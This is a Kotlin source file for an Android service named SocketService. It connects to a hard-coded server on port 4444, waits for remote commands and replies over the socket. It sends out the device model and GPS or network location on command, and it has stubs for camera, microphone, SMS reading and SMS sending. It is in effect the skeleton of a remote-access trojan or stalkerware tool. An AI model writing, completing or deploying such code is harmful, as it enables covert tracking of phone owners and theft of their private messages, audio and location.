package com.example.socketclient

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Point
import android.location.Location
import android.location.LocationManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.io.IOException
import java.net.Socket
import kotlin.concurrent.thread

class SocketService : Service() {

    private val SERVER_IP = "192.168.43.27"
    private val SERVER_PORT = 4444
    private val DELIMITER = "\nJ\\."

    private var socket: Socket? = null

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null

    override fun onCreate() {
        super.onCreate()
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceWithNotification()
        connectToServer()
        return START_STICKY
    }

    private fun startForegroundServiceWithNotification() {
        val channelId = "SocketServiceChannel"
        val channelName = "Socket Service"

        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            notificationManager.createNotificationChannel(channel)
        }

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Socket Service Running")
            .setContentText("Listening for remote commands")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(1, notification)
    }

    private fun connectToServer() {
        thread {
            try {
                socket = Socket(SERVER_IP, SERVER_PORT)
                listenForCommands()
            } catch (e: IOException) {
                e.printStackTrace()
                stopSelf()
            }
        }
    }

    private fun listenForCommands() {
        try {
            val input = socket?.getInputStream()
            val buffer = ByteArray(8192)
            while (true) {
                val length = input?.read(buffer) ?: -1
                if (length > 0) {
                    val command = String(buffer, 0, length).trim()
                    handleCommand(command)
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
            stopSelf()
        }
    }

    private fun handleCommand(data: String) {
        val parts = data.split(DELIMITER)
        when (parts[0]) {
            "~" -> {
                val deviceInfo = "${Build.MANUFACTURER}/${Build.MODEL}"
                sendData("~$DELIMITER$deviceInfo")
            }
            "!" -> {
                val size = getScreenSize()
                sendData("!$DELIMITER${size.first}$DELIMITER${size.second}")
            }
            "@" -> {
                captureScreenAndSend()
            }
            "LOC" -> {
                fetchAndSendLocation()
            }
            "CAM" -> {
                // TODO: Implement camera capture and send image data
                sendData("CAM$DELIMITER Not implemented yet")
            }
            "MIC" -> {
                // TODO: Implement microphone recording and send audio data
                sendData("MIC$DELIMITER Not implemented yet")
            }
            "SMS" -> {
                // TODO: Read SMS messages and send
                sendData("SMS$DELIMITER Not implemented yet")
            }
            "SENDSMS" -> {
                // TODO: Send SMS using SmsManager
                sendData("SENDSMS$DELIMITER Not implemented yet")
            }
            "close" -> {
                stopSelf()
            }
            else -> {
                sendData("ERR$DELIMITER Unknown command")
            }
        }
    }

    private fun getScreenSize(): Pair<Int, Int> {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val display = wm.defaultDisplay
        val size = Point()
        display.getRealSize(size)
        return Pair(size.x, size.y)
    }

    private fun captureScreenAndSend() {
        // This cannot be done from a Service due to MediaProjection needing user consent
        // You should trigger a request from MainActivity and share the data via Intent or IPC
        sendData("@$DELIMITER Not implemented in service. Start from MainActivity.")
    }

    private fun fetchAndSendLocation() {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            val locGps: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val locNet: Location? = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            val loc = locGps ?: locNet

            if (loc != null) {
                sendData("LOC$DELIMITER${loc.latitude}$DELIMITER${loc.longitude}")
            } else {
                sendData("LOC$DELIMITER Location unavailable")
            }
        } catch (e: SecurityException) {
            sendData("LOC$DELIMITER Permission denied")
        }
    }

    private fun sendData(message: String) {
        thread {
            try {
                socket?.getOutputStream()?.apply {
                    write(message.toByteArray())
                    flush()
                }
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            socket?.close()
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
